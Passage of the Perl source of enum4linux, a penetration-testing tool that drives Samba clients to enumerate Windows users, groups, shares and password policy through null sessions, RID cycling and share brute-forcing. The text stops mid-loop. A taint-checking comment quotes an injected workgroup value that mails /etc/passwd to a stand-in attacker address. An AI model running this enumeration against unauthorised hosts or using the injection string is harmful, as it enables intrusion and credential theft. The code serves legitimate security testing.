#!/usr/bin/perl
# enum4linux - Windows enumeration tool for Linux
# Copyright (C) 2011  Mark Lowe
# 
# This tool may be used for legal purposes only.  Users take full responsibility
# for any actions performed using this tool.  The author accepts no liability
# for damage caused by this tool.  If these terms are not acceptable to you, then
# you are not permitted to use this tool.
#
# In all other respects the GPL version 2 applies:
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
# 
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
# 
# You should have received a copy of the GNU General Public License along
# with this program; if not, write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
#
# You are encouraged to send comments, improvements or suggestions to
# me at mrl@portcullis-security.com
#
# TODO
#
# * replace system($string) with system($prog, @args).
#
# * Search RID space intellegently.  Samba starts accounts at 0, but
#   Windows starts at 500.  We don't want to search 0-500 on all
#   hosts.  Maybe check 0-10 and abort if nothing is found.  Some SIDs
#   on samba servers start RIDs much higher (3000+).  How do we make
#   sure we get all these.
#
# * Mutliple SIDs can be found on some hosts (samba).  
#
# * Output Group Memberships in a more parsable format.
#
use strict;
use warnings;
use Getopt::Std;
use File::Basename;
use Data::Dumper;
use Scalar::Util qw(tainted);

my $VERSION="0.8.9";
my $verbose = 0;
my $debug = 0;
my $global_fail_limit = 1000;     # no command line option yet
my $global_search_until_fail = 0; # no command line option yet
my $heighest_rid = 999999;
my $global_workgroup = undef;
my $global_username = '';
my $global_password = '';
my $global_dictionary = 0;
my $global_filename = undef;
my $global_share_file = undef;
my $global_detailed = 0;
my $global_passpol = 0;
my $global_rid_range = "500-550,1000-1050";
my $global_known_username_string = "administrator,guest,krbtgt,domain admins,root,bin,none";
my @dependent_programs = qw(nmblookup net rpcclient smbclient);
my @optional_dependent_programs = qw(polenum.py ldapsearch);
my %odp_present = ();
my $null_session_test = 0;
my %opts;

###############################################################################
# The following  mappings for nmblookup (nbtstat) status codes to human readable
# format is taken from nbtscan 1.5.1 "statusq.c".  This file in turn
# was derived from the Samba package which contains the following
# license:
#    Unix SMB/Netbios implementation
#    Version 1.9
#    Main SMB server routine
#    Copyright (C) Andrew Tridgell 1992-199
# 
#    This program is free software; you can redistribute it and/or modif
#    it under the terms of the GNU General Public License as published b
#    the Free Software Foundation; either version 2 of the License, o
#    (at your option) any later version
# 
#    This program is distributed in the hope that it will be useful
#    but WITHOUT ANY WARRANTY; without even the implied warranty o
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See th
#    GNU General Public License for more details
# 
#    You should have received a copy of the GNU General Public Licens
#    along with this program; if not, write to the Free Softwar
#    Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA

my @nbt_info = (
["__MSBROWSE__", "01", 0, "Master Browser"],
["INet~Services", "1C", 0, "IIS"],
["IS~", "00", 1, "IIS"],
["", "00", 1, "Workstation Service"],
["", "01", 1, "Messenger Service"],
["", "03", 1, "Messenger Service"],
["", "06", 1, "RAS Server Service"],
["", "1F", 1, "NetDDE Service"],
["", "20", 1, "File Server Service"],
["", "21", 1, "RAS Client Service"],
["", "22", 1, "Microsoft Exchange Interchange(MSMail Connector)"],
["", "23", 1, "Microsoft Exchange Store"],
["", "24", 1, "Microsoft Exchange Directory"],
["", "30", 1, "Modem Sharing Server Service"],
["", "31", 1, "Modem Sharing Client Service"],
["", "43", 1, "SMS Clients Remote Control"],
["", "44", 1, "SMS Administrators Remote Control Tool"],
["", "45", 1, "SMS Clients Remote Chat"],
["", "46", 1, "SMS Clients Remote Transfer"],
["", "4C", 1, "DEC Pathworks TCPIP service on Windows NT"],
["", "52", 1, "DEC Pathworks TCPIP service on Windows NT"],
["", "87", 1, "Microsoft Exchange MTA"],
["", "6A", 1, "Microsoft Exchange IMC"],
["", "BE", 1, "Network Monitor Agent"],
["", "BF", 1, "Network Monitor Application"],
["", "03", 1, "Messenger Service"],
["", "00", 0, "Domain/Workgroup Name"],
["", "1B", 1, "Domain Master Browser"],
["", "1C", 0, "Domain Controllers"],
["", "1D", 1, "Master Browser"],
["", "1E", 0, "Browser Service Elections"],
["", "2B", 1, "Lotus Notes Server Service"],
["IRISMULTICAST", "2F", 0, "Lotus Notes"],
["IRISNAMESERVER", "33", 0, "Lotus Notes"],
['Forte_$ND800ZA', "20", 1, "DCA IrmaLan Gateway Server Service"]
);
####################### end of nbtscan-derrived code ############################

my $usage =<<USAGE;
enum4linux v$VERSION \(http://labs.portcullis.co.uk/application/enum4linux/\)
Copyright \(C\) 2011 Mark Lowe \(mrl\@portcullis-security.com\)

Simple wrapper around the tools in the samba package to provide similar 
functionality to enum.exe (formerly from www.bindview.com).  Some additional 
features such as RID cycling have also been added for convenience.

Usage: $0 [options] ip

Options are (like "enum"):
    -U        get userlist
    -M        get machine list*
    -S        get sharelist
    -P        get password policy information
    -G        get group and member list
    -d        be detailed, applies to -U and -S
    -u user   specify username to use (default "")  
    -p pass   specify password to use (default "")   

The following options from enum.exe aren't implemented: -L, -N, -D, -f

Additional options:
    -a        Do all simple enumeration (-U -S -G -P -r -o -n -i).
              This opion is enabled if you don't provide any other options.
    -h        Display this help message and exit
    -r        enumerate users via RID cycling
    -R range  RID ranges to enumerate (default: $global_rid_range, implies -r)
    -K n      Keep searching RIDs until n consective RIDs don't correspond to
              a username.  Impies RID range ends at $heighest_rid. Useful 
	      against DCs.
    -l        Get some (limited) info via LDAP 389/TCP (for DCs only)
    -s file   brute force guessing for share names
    -k user   User(s) that exists on remote system (default: $global_known_username_string)
              Used to get sid with "lookupsid known_username"
    	      Use commas to try several users: "-k admin,user1,user2"
    -o        Get OS information
    -i        Get printer information
    -w wrkg   Specify workgroup manually (usually found automatically)
    -n        Do an nmblookup (similar to nbtstat)
    -v        Verbose.  Shows full commands being run (net, rpcclient, etc.)

RID cycling should extract a list of users from Windows \(or Samba\) hosts 
which have RestrictAnonymous set to 1 \(Windows NT and 2000\), or \"Network 
access: Allow anonymous SID/Name translation\" enabled \(XP, 2003\).

NB: Samba servers often seem to have RIDs in the range 3000-3050.

Dependancy info: You will need to have the samba package installed as this 
script is basically just a wrapper around rpcclient, net, nmblookup and 
smbclient.  Polenum from http://labs.portcullis.co.uk/application/polenum/ 
is required to get Password Policy info.

USAGE

# Notes on Taint
# --------------
#
# This script should run OK with Taint checking on (perl -T).  I've
# turned it off because it complains about your path somethimes which
# users found annoying.
#
# I mainly implemented taint checking incase someone set up a malicious server to return
# a workgroup like: WORK; cat /etc/passwd | mail hacker@evil.net;
#
# I've also been paranoid and applied taint checking to command line options.  This
# isn't necessarily particularly useful, though.

# Untaint PATH.  We're not too bothered about mailicious paths for the usage of this
# tool, but we must remove "." from the path to keep perl happy.
$ENV{'PATH'} =~ /(.*)/;
$ENV{'PATH'} = $1;
$ENV{'PATH'} =~ s/^://;
$ENV{'PATH'} =~ s/:$//;
$ENV{'PATH'} =~ s/^\.://;
$ENV{'PATH'} =~ s/:\.//;

getopts('UMNSPGlLDu:dp:f:rR:s:k:vow:hnaiPK:', \%opts);

# Print help message if required
if ($opts{'h'}) {
	print $usage;
	exit 0;
}

# Read host and untaint
my $global_target = shift or die $usage;
if ($global_target =~ /^([a-zA-Z0-9\._-]+)$/) {
	$global_target = $1;
} else {
	print "ERROR: Target hostname \"$global_target\" contains some illegal characters\n";
	exit 1;
}

#
# Read in options
#

# Enable -a if no other options (apart from -v) are given
unless (scalar( grep { $_ ne 'v' } keys %opts)) {
	$opts{'a'} = 1;
}

# Turn on some other options if -a given
if ($opts{'a'}) {
	$opts{'U'} = 1;
	$opts{'S'} = 1;
	$opts{'G'} = 1;
	$opts{'r'} = 1;
	$opts{'P'} = 1;
	$opts{'o'} = 1;
	$opts{'n'} = 1;
	$opts{'i'} = 1;
}

$global_username       = $opts{'u'} if $opts{'u'};
$global_password       = $opts{'p'} if $opts{'p'};
$global_detailed       = $opts{'d'} if $opts{'d'};
$global_dictionary     = $opts{'D'} if $opts{'D'};
$global_filename       = $opts{'f'} if $opts{'f'};
$global_rid_range      = $opts{'R'} if $opts{'R'};
$global_passpol        = $opts{'P'} if $opts{'P'};
$global_fail_limit     = $opts{'K'} if $opts{'K'};
$global_share_file     = $opts{'s'} if $opts{'s'};
$global_known_username_string = $opts{'k'} if $opts{'k'};
$global_workgroup      = $opts{'w'} if $opts{'w'};
$verbose               = $opts{'v'} if $opts{'v'};
$opts{'r'}             = 1          if $opts{'R'};

$global_search_until_fail = 1 if defined($opts{'K'});

my @global_known_usernames = split(",", $global_known_username_string);

# Check that dependant programs are present on the system - hopefull "which" is installed!
my $dependency_error = 0;
foreach my $prog (@dependent_programs) {
	my $which_output = `which $prog 2>&1`;
	chomp $which_output;
	if ($which_output !~ /^\/.*\/$prog$/) {
		print "ERROR: $prog is not in your path.  Check that samba package is installed\n";
		$dependency_error = 1;
	} else {
		print "[V] Dependent program \"$prog\" found in $which_output\n" if $verbose;
	}
}
foreach my $prog (@optional_dependent_programs) {
	my $which_output = `which $prog 2>&1`;
	chomp $which_output;
	if ($which_output !~ /^\/.*\/$prog$/) {
		print "WARNING: $prog is not in your path.  Check that package is installed and your PATH is sane.\n";
		$odp_present{$prog} = 0;
	} else {
		print "[V] Dependent program \"$prog\" found in $which_output\n" if $verbose;
		$odp_present{$prog} = 1;
	}
}
if ($dependency_error) {
	print "For Gentoo, you need to install the \"samba\" package\n";
	print "For Debian, you need to install the \"smbclient\" package\n";
	exit 1;
}

# Untaint workgroup if supplied on command line
if (defined($global_workgroup)) {
	if ($global_workgroup =~ /^([a-zA-Z0-9\.-_]*)$/) {
		$global_workgroup = $1;
	} else {
		print "ERROR: Workgroup \"$global_workgroup\"contains some illegal characters\n";
		exit 1;
	}
}

# We're going to use hard quotes around all variables used in "system" calls.
# We don't want bad data to be able to break out of these quotes.
foreach my $known_username (@global_known_usernames) {
	$known_username =~ s/'/'\''/g; ($known_username) = $known_username =~ /(.*)/;
}
$global_username =~ s/'/'\''/g;       ($global_username)       = $global_username       =~ /(.*)/;
$global_password =~ s/'/'\''/g;       ($global_password)       = $global_password       =~ /(.*)/;

# Output message about options used
print "Starting enum4linux v$VERSION ( http://labs.portcullis.co.uk/application/enum4linux/ ) on " .  scalar(localtime) . "\n";
print_heading("Target Information");
print "Target ........... $global_target\n";
print "RID Range ........ $global_rid_range\n";
print "Username ......... '$global_username'\n";
print "Password ......... '$global_password'\n";
print "Known Usernames .. " . join(", ", @global_known_usernames) . "\n";
print "\n";

# Basic enumeration, check session
get_workgroup();
get_nbtstat()          if $opts{'n'};
make_session();
get_ldapinfo()         if $opts{'l'};
get_domain_sid();
get_os_info()          if $opts{'o'};

# enum-compatible functions
enum_users()           if $opts{'U'};
enum_machines()        if $opts{'M'};
enum_names()           if $opts{'N'};
enum_shares()          if $opts{'S'};
enum_password_policy() if $opts{'P'};
enum_groups()          if $opts{'G'};
enum_dom_groups()      if $opts{'G'};
enum_lsa_policy()      if $opts{'L'};

# extra stuff that runs slowly
enum_users_rids()      if $opts{'r'};
enum_shares_unauth()   if $opts{'s'};
get_printer_info()     if $opts{'i'};

print "enum4linux complete on " . scalar(localtime) . "\n\n";

sub get_nbtstat {
	print_heading("Nbtstat Information for $global_target");
	my $output = `nmblookup -A '$global_target' 2>&1`;
	$output = nbt_to_human($output);
	print "$output\n";
}

sub get_domain_sid {
	print_heading("Getting domain SID for $global_target");
	my $command = "rpcclient -W '$global_workgroup' -U'$global_username'\%'$global_password' $global_target -c 'lsaquery' 2>&1";
	print "[V] Attempting to get domain SID with command: $command\n" if $verbose;
	my $domain_sid_text = `$command`;
	chomp $domain_sid_text;
	print $domain_sid_text;
	print "\n";
	if ($domain_sid_text =~ /Domain Sid: S-0-0/) {
		print "[+] Host is part of a workgroup (not a domain)\n";
	} elsif ($domain_sid_text =~ /Domain Sid: S-\d+-\d+-\d+-\d+-\d+-\d+/) {
		print "[+] Host is part of a domain (not a workgroup)\n";
	} else {
		print "[+] Can't determine if host is part of domain or part of a workgroup\n";
	}
}

# Get workgroup from nbstat info - we need this for lots of rpcclient calls
sub get_workgroup {
	print_heading("Enumerating Workgroup/Domain on $global_target");
	print "[V] Attempting to get domain name with command: nmblookup -A '$global_target'\n" if $verbose;

	# Workgroup might already be known - e.g. from command line or from get_os_info()
	unless ($global_workgroup) {
		print "target is tainted\n" if tainted($global_target); # DEBUG
		$global_workgroup = `nmblookup -A '$global_target'`; # Global var.  Erg!
		($global_workgroup) = $global_workgroup =~ /\s+(\S+)\s+<00> - <GROUP>/s;
		unless (defined($global_workgroup)) {
			print "[E] Can\'t find workgroup/domain\n";
			print "\n";
			return undef;
		}
		unless (defined($global_workgroup) and $global_workgroup =~ /^[A-Za-z0-9_\.-]+$/) {
			print "ERROR: Workgroup \"$global_workgroup\"contains some illegal characters\n";
			exit 1;
		}
	}
	print "[+] Got domain/workgroup name: $global_workgroup\n";
}

# Get long domain name via LDAP
# We don't do this by default because LDAP ports might not be present, or firewalled.
sub get_ldapinfo {
	print_heading("Getting information via LDAP for $global_target");
	my $command = "ldapsearch -x -h '$global_target' -p 389 -s base namingContexts 2>&1";
	print "[V] Attempting to long domain name: $command\n" if $verbose;
	unless ($odp_present{"ldapsearch"}) {
		print "[E] Dependent program \"ldapsearch\" not present.  Skipping this check.  Install ldapsearch to fix.\n\n";
		return 0;
	}

	my $output = `$command`;

	if ($output =~ /ldap_sasl_bind/) {
		print "[E] Connection error\n";
		return 0;
	}
	my $parent = 0;
	foreach my $line (split "\n", $output) {
		if ($line =~ /namingContexts: DC=DomainDnsZones/ or $line =~ /namingContexts: DC=ForestDnsZones/) {
			$parent = 1;
		} elsif ($line =~ /namingContexts:\s+(DC=[^,]+,DC=.*)/) {
			my $long_domain = $1;
			$long_domain =~ s/DC=//g;
			$long_domain =~ s/,/./g;
			print "[+] Long domain name for $global_target: $long_domain\n";
		}
	}

	if ($parent == 1) {
		print "[+] $global_target appears to be a root/parent DC\n";
	} else {
		print "[+] $global_target appears to be a child DC\n";
	}

}

# See if we can connect using a null session or supplied credentials
sub make_session {
	print_heading("Session Check on $global_target");
	my $command = "smbclient -W '$global_workgroup' //'$global_target'/ipc\$ -U'$global_username'\%'$global_password' -c 'help' 2>&1";
	print "[V] Attempting to make null session using command: $command\n" if $verbose;
	my $os_info = `$command`;
	chomp $os_info;
	if ($os_info =~ /case_sensitive/) {
		print "[+] Server $global_target allows sessions using username '$global_username', password '$global_password'\n";
	} else {
		print "[E] Server doesn't allow session using username '$global_username', password '$global_password'.  Aborting remainder of tests.\n";
		exit 1;
	}

	# Use this info to set workgroup if possible
	unless ($global_workgroup) {
		($global_workgroup) = $os_info =~ /Domain=\[([^]]*)\]/;
		print "[+] Got domain/workgroup name: $global_workgroup\n";
	}
}

# Get OS info
sub get_os_info {
	print_heading("OS information on $global_target");
	my $command = "smbclient -W '$global_workgroup' //'$global_target'/ipc\$ -U'$global_username'\%'$global_password' -c 'q' 2>&1";
	print "[V] Attempting to get OS info with command: $command\n" if $verbose;
	my $os_info = `$command`;
	chomp $os_info;
	if (defined($os_info)) {
		($os_info) = $os_info =~ /(Domain=[^\n]+)/s;
		print "[+] Got OS info for $global_target from smbclient: $os_info\n";
	}

	$command = "rpcclient -W '$global_workgroup' -U'$global_username'\%'$global_password' -c 'srvinfo' '$global_target' 2>&1";
	print "[V] Attempting to get OS info with command: $command\n" if $verbose;
	$os_info = `$command`;
	if (defined($os_info)) {
		if ($os_info =~ /error: NT_STATUS_ACCESS_DENIED/) {
			print "[E] Can't get OS info with srvinfo: NT_STATUS_ACCESS_DENIED\n";
		} else {
			print "[+] Got OS info for $global_target from srvinfo:\n$os_info";
		}
	}
}

sub enum_password_policy {
	print_heading("Password Policy Information for $global_target");
	my $command = "polenum.py '$global_username':'$global_password'\@'$global_target' 2>&1";
	unless ($odp_present{"polenum.py"}) {
		print "[E] Dependent program \"polenum.py\" not present.  Skipping this check.  Download polenum from http://labs.portcullis.co.uk/application/polenum/\n\n";
		return 0;
	}
	print "[V] Attempting to get Password Policy info with command: $command\n" if $verbose;
	my $passpol_info = `$command`;
	chomp $passpol_info;
	if (defined($passpol_info)) {
		if ($passpol_info =~ /Account Lockout Threshold/) {
			print $passpol_info;
		} elsif ($passpol_info =~ /Error Getting Password Policy: Connect error/) {
			print "[E] Can't connect to host with supplied credentials.\n";
		} else {
			print "[E] Unexpected error from polenum.py:\n";
			print $passpol_info;
		}
	} else {
		print "[E] polenum.py gave no output.\n";
	}
	$command = "rpcclient -W '$global_workgroup' -U'$global_username'\%'$global_password' '$global_target' -c \"getdompwinfo\" 2>&1";
	print "[V] Attempting to get Password Policy info with command: $command\n" if $verbose;
	$passpol_info = `$command`;
	chomp $passpol_info;
	print "\n";
	if (defined($passpol_info) and $passpol_info !~ /ACCESS_DENIED/) {
		print "[+] Retieved partial password policy with rpcclient:\n\n";
		if ($passpol_info =~ /password_properties: 0x[0-9a-fA-F]{7}0/) {
			print "Password Complexity: Disabled\n";
		} elsif ($passpol_info =~ /password_properties: 0x[0-9a-fA-F]{7}1/) {
			print "Password Complexity: Enabled\n";
		}
		if ($passpol_info =~ /min_password_length: (\d+)/) {
			my $minlen = $1;
			print "Minimum Password Length: $minlen\n";
		}
	} else {
		print "[E] Failed to get password policy with rpcclient\n";
	}
	print "\n";
}

sub enum_lsa_policy {
	print_heading("LSA Policy Information on $global_target");
	print "[E] Internal error.  Not implmented in this version of enum4linux.\n";
}

sub enum_machines {
	print_heading("Machine Enumeration on $global_target");
	print "[E] Internal error.  Not implmented in this version of enum4linux.\n";
}

sub enum_names {
	print_heading("Name Enumeration on $global_target");
	print "[E] Internal error.  Not implmented in this version of enum4linux.\n";
}

sub enum_groups {
	print_heading("Groups on $global_target");
	foreach my $grouptype ("builtin", "domain") {
		# Get list of groups
		my $command = "rpcclient -W '$global_workgroup' -U'$global_username'\%'$global_password' '$global_target' -c 'enumalsgroups $grouptype' 2>&1";
		if ($grouptype eq "domain") {
			print "[V] Getting local groups with command: $command\n" if $verbose;
			print "\n[+] Getting local groups:\n";
		} else {
			print "[V] Getting $grouptype groups with command: $command\n" if $verbose;
			print "\n[+] Getting $grouptype groups:\n";
		}
		my $groups_string = `$command`;
		if ($groups_string =~ /error: NT_STATUS_ACCESS_DENIED/) {
			if ($grouptype eq "domain") {
				print "[E] Can't get local groups: NT_STATUS_ACCESS_DENIED\n";
			} else {
				print "[E] Can't get $grouptype groups: NT_STATUS_ACCESS_DENIED\n";
			}
		} else {
			($groups_string) = $groups_string =~ /(group:.*)/s;
			$groups_string = "" unless defined($groups_string);
			print $groups_string;
		}

		# Get group members
		my %rid_of_group = $groups_string =~ /\[([^\]]+)\]/sg;
		if ($grouptype eq "domain") {
			print "\n[+] Getting local group memberships:\n";
		} else {
			print "\n[+] Getting $grouptype group memberships:\n";
		}
		foreach my $groupname (keys %rid_of_group) {
			$groupname =~ s/'/'\\''/g;
			$rid_of_group{$groupname} =~ s/^0x//;
			$rid_of_group{$groupname} = hex($rid_of_group{$groupname});
			$command = "net rpc group members '$groupname' -W '$global_workgroup' -I '$global_target' -U'$global_username'\%'$global_password' 2>&1\n";
			print "[V] Running command: $command\n" if $verbose;
			my $members = `$command`;
			my @members = split "\n", $members;
			foreach my $m (@members) {
				print "Group '$groupname' (RID: " . $rid_of_group{$groupname} . ") has member: $m\n";
			}
		}
		if ($global_detailed) {
			foreach my $groupname (keys %rid_of_group) {
				print "[+] Getting detailed info for group $groupname (RID: " . $rid_of_group{$groupname} . ")\n";
				get_group_details_from_rid($rid_of_group{$groupname});
			}
		}
	}
}

sub enum_dom_groups {
	# Get list of groups
	my $command = "rpcclient -W '$global_workgroup' -U'$global_username'\%'$global_password' '$global_target' -c \"enumdomgroups\" 2>&1";
	print "[V] Getting domain groups with command: $command\n" if $verbose;
	print "\n[+] Getting domain groups:\n";

	my $groups_string = `$command`;
	if ($groups_string =~ /error: NT_STATUS_ACCESS_DENIED/) {
		print "[E] Can't get domain groups: NT_STATUS_ACCESS_DENIED\n";
	} else {
		($groups_string) = $groups_string =~ /(group:.*)/s;
		$groups_string = "" unless defined($groups_string);
		print $groups_string;
	}

	# Get group members
	my %rid_of_group = $groups_string =~ /\[([^\]]+)\]/sg;
	print "\n[+] Getting domain group memberships:\n";

	foreach my $groupname (keys %rid_of_group) {
		$groupname =~ s/'/'\\''/g;
		$rid_of_group{$groupname} =~ s/^0x//;
		$rid_of_group{$groupname} = hex($rid_of_group{$groupname});
		$command = "net rpc group members '$groupname' -W '$global_workgroup' -I '$global_target' -U'$global_username'\%'$global_password' 2>&1\n";
		print "[V] Running command: $command\n" if $verbose;
		my $members = `$command`;
		my @members = split "\n", $members;
		foreach my $m (@members) {
			print "Group '$groupname' (RID: " . $rid_of_group{$groupname} . ") has member: $m\n";
		}
	}
	if ($global_detailed) {
		foreach my $groupname (keys %rid_of_group) {
			print "[+] Getting detailed info for group $groupname (RID: " . $rid_of_group{$groupname} . ")\n";
			get_group_details_from_rid($rid_of_group{$groupname});
		}
	}
}

sub enum_groups_unauth {
	print_heading("Groups on $global_target via RID cycling");
	print "[E] INTERNAL ERROR.  Not implmented yet.  Maybe in the next version.\n";
}

sub enum_shares {
	# Share enumeration
	print_heading("Share Enumeration on $global_target");
	print "[V] Attempting to get share list using authentication\n" if $verbose;
	# my $shares = `net rpc share -W '$global_workgroup' -I '$global_target' -U'$global_username'\%'$global_password' 2>&1`;
	my $command = "smbclient -W '$global_workgroup' -L //'$global_target' -U'$global_username'\%'$global_password' 2>&1";
	my $shares = `$command`;
	if (defined($shares)) {
		if ($shares =~ /NT_STATUS_ACCESS_DENIED/) {
			print "[E] Can't list shares: NT_STATUS_ACCESS_DENIED\n";
		} else {
			print "$shares";
		}
	}

	print "\n[+] Attempting to map shares on $global_target\n";
	my @shares = $shares =~ /\n\s+(\S+)\s+(?:Disk|IPC|Printer)/igs;
	foreach my $share (@shares) {
		$share =~ s/'/'\\''/g;
		my $command = "smbclient -W '$global_workgroup' //'$global_target'/'$share' -U'$global_username'\%'$global_password' -c dir 2>&1";
		print "[V] Attempting map to share //$global_target/$share with command: $command\n" if $verbose;
		my $output = `$command`;
		print "//$global_target/$share\t";
		if ($output =~ /NT_STATUS_ACCESS_DENIED listing/) {
			print "Mapping: OK\tListing: DENIED\n";
		} elsif ($output =~ /tree connect failed: NT_STATUS_ACCESS_DENIED/) {
			print "Mapping: DENIED, Listing: N/A\n";
		} elsif ($output =~ /\n\s+\.\.\s+D.*\d{4}\n/) {
			print "Mapping: OK, Listing: OK\n";
		} else {
			print "[E] Can't understand response:\n";
			print $output;
		}
	}
}

sub enum_shares_unauth {
	print_heading("Brute Force Share Enumeration on $global_target");
	print "[V] Attempting to get share list using bruteforcing\n" if $verbose;
	my $shares_file = $global_share_file;
	open SHARES, "<$shares_file" or die "[E] Can't open share list file $shares_file: $!\n";
	my @shares = <SHARES>;
	for (@shares) {chomp};
	
	foreach my $share (@shares) {
		# Untaint $share
		if ($share =~ /^([a-zA-Z0-9\._\$-]+)$/) {
			$share = $1;
		} else {
			print "ERROR: Share name $share contains some illegal characters\n";
			exit 1;
		}

		my $result = `smbclient -W '$global_workgroup' //'$global_target'/'$share' -c dir -U'$global_username'\%'$global_password' 2>&1`;
		if ($result =~ /blocks of size .* blocks available/) {
			print "$share EXISTS, Allows access using username: '$global_username', password: '$global_password'\n";
		} elsif ($result =~ /NT_STATUS_BAD_NETWORK_NAME/) {
			print "$share doesn't exist\n" if $debug;
		} elsif ($result =~ /NT_STATUS_ACCESS_DENIED/) {
			print "$share EXISTS\n";
		} else {
			print $result;
		}
	}
}

sub enum_users_rids {
	print_heading("Users on $global_target via RID cycling (RIDS: $global_rid_range)");
	
	my $sid;
	my %sids = ();
	my $logon;
	my $cleansid;
	# Get SID - try other known usernames if necessary
	foreach my $known_username (@global_known_usernames) {
		my $command = "rpcclient -W '$global_workgroup' -U'$global_username'\%'$global_password' '$global_target' -c 'lookupnames $known_username' 2>&1";
		print "[V] Attempting to get SID from $global_target with command: $command\n" if $verbose;
		print "[V] Assuming that user \"$known_username\" exists\n" if $verbose;
		$logon = "username '$global_username', password '$global_password'";
		$sid = `$command`;
		if ($sid =~ /NT_STATUS_ACCESS_DENIED/) {
			print "[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.\n";
			last;
		} elsif ($sid =~ /NT_STATUS_NONE_MAPPED/) {
			print "[V] User \"$known_username\" doesn't exist.  User enumeration should be possible, but SID needed...\n" if $verbose;
			next;
		} elsif ($sid =~ /S-1-5-21-[\d-]+-\d+\s+/) {
			($cleansid) = $sid =~ /(S-1-5-21-[\d-]+)-\d+\s+/;
			print "[I] Found new SID: $cleansid\n" unless defined($sids{$cleansid});
			$sids{$cleansid} = 1;
			next;
		} elsif ($sid =~ /S-1-5-[\d-]+-\d+\s+/) {
			($cleansid) = $sid =~ /(S-1-5-[\d-]+)-\d+\s+/;
			print "[I] Found new SID: $cleansid\n" unless defined($sids{$cleansid});
			$sids{$cleansid} = 1;
			next;
		} elsif ($sid =~ /S-1-22-[\d-]+-\d+\s+/) {
			($cleansid) = $sid =~ /(S-1-22-[\d-]+)-\d+\s+/;
			print "[I] Found new SID: $cleansid\n" unless defined($sids{$cleansid});
			$sids{$cleansid} = 1;
			next;
		} else {
			next;
		}
	}

	# Get some more SIDs (hopefully)
	my $command = "rpcclient -W '$global_workgroup' -U'$global_username'\%'$global_password' '$global_target' -c lsaenumsid 2>&1";
	print "[V] Attempting to get SIDs from $global_target with command: $command\n" if $verbose;
	my $sids = `$command`;
	foreach my $sid ($sids =~ /(S-[0-9-]+)/g) {
		print "[V] Processing SID $sid\n" if $verbose;
		if ($sid =~ /NT_STATUS_ACCESS_DENIED/) {
			print "[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.\n";
			next;
		} elsif ($sid =~ /S-1-5-21-[\d-]+-\d+/) {
			($cleansid) = $sid =~ /(S-1-5-21-[\d-]+)-\d+/;
			print "[I] Found new SID: $cleansid\n" unless defined($sids{$cleansid});
			$sids{$cleansid} = 1;
			next;
		} elsif ($sid =~ /S-1-5-[\d-]+-\d+/) {
			($cleansid) = $sid =~ /(S-1-5-[\d-]+)-\d+/;
			print "[I] Found new SID: $cleansid\n" unless defined($sids{$cleansid});
			$sids{$cleansid} = 1;
			next;
		} elsif ($sid =~ /S-1-22-[\d-]+-\d+/) {
			($cleansid) = $sid =~ /(S-1-22-[\d-]+)-\d+/;
			print "[I] Found new SID: $cleansid\n" unless defined($sids{$cleansid});
			$sids{$cleansid} = 1;
			next;
		} else {
			next;
		}
	}

	foreach my $sid (keys %sids) {
		if (! defined($sid) and $global_username) {
			print "[V] WARNING: Can\'t get SID.  Maybe none of the 'known' users really exist.  Try others with -k.  Trying null session.\n" if $verbose;
			foreach my $known_username (@global_known_usernames) {
				my $command = "rpcclient -W '$global_workgroup' -U% '$global_target' -c 'lookupnames $known_username' 2>&1";
				print "[I] Assuming that user $known_username exists\n";
				print "[V] Trying null username and password: $command\n" if $verbose;
				$sid=`$command`;
				if ($sid =~ /error: NT_STATUS_ACCESS_DENIED/) {
					print "[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED\n";
					next;
				} else {
					last;
				}
			}
			($sid) = $sid =~ /(S-1-5-21-[\d-]+)-\d+\s+/;
			unless (defined($sid)) {
				print "[E] Can't get SID using either a null username or the username \"$global_username\"\n";
				exit 1;
			}
			$logon = "username '', password ''"
		}
		unless (defined($sid)) {
			print "[E] Couldn't find SID.  Aborting RID cycling attempt.\n\n";
			return 1;
		}
		print "[+] Enumerating users using SID $sid and logon $logon\n";
		
		# RID Cycle;
		my $last_range = 0;
		my @ranges = split(",", $global_rid_range);
		foreach my $rid_range (@ranges) {
			$last_range = 1 if $rid_range eq $ranges[scalar(@ranges) - 1];
			my ($start_rid, $end_rid);
		
			# Check range is of form n-m (n,m integers)
			if ($rid_range =~ /\d+-\d+/) {
				($start_rid, $end_rid) = $rid_range =~ /^(\d+)-(\d+)$/;
				
			# Check range is of form n (n integer)
			} elsif ($rid_range =~ /^\d+$/) {
				($start_rid, $end_rid) = ($rid_range, $rid_range);
		
			# Invalid range
			} else {
				print "WARNING: RID range $rid_range isn't valid.  Should be like 10-20 or 1199.  Ignoring this range\n";
				next;
			}
		
			# Check we have an ascending range
			if ($start_rid > $end_rid) {	
				print "WARNING: RID range $rid_range seems to be reversed.  Automatically reversing.\n";
				($start_rid, $end_rid) = ($end_rid, $start_rid);
			}
		
			if ($global_search_until_fail) {
				$end_rid = 500000;
			}
	
			my $fail_count = 0;
			if ($global_search_until_fail and $last_range) {
				$end_rid = $heighest_rid;
			}
			foreach my $rid ($start_rid..$end_rid) {
				my $output = `rpcclient -W '$global_workgroup' -U'$global_username'\%'$global_password' '$global_target' -c 'lookupsids $sid-$rid' 2>&1`;
				my ($sid_and_user) = $output =~ /(S-\d+-\d+-\d+-[\d-]+\s+[^\)]+\))/;
				if ($sid_and_user) {
					$sid_and_user =~ s/\(1\)/(Local User)/;
					$sid_and_user =~ s/\(2\)/(Domain Group)/;
					$sid_and_user =~ s/\(2\)/(Domain User)/;
					$sid_and_user =~ s/\(4\)/(Local Group)/;
	
					# Samba servers sometimes claim to have user accounts
					# with the same name as the UID/RID.  We don't report these.
					if ($sid_and_user =~ /-(\d+) .*\\\1 \(/) {
						$fail_count++;
					} else {
						print "$sid_and_user\n";
						$fail_count = 0;
						get_user_details_from_rid($rid) if $sid_and_user =~ /\((Local|Domain) User\)/;
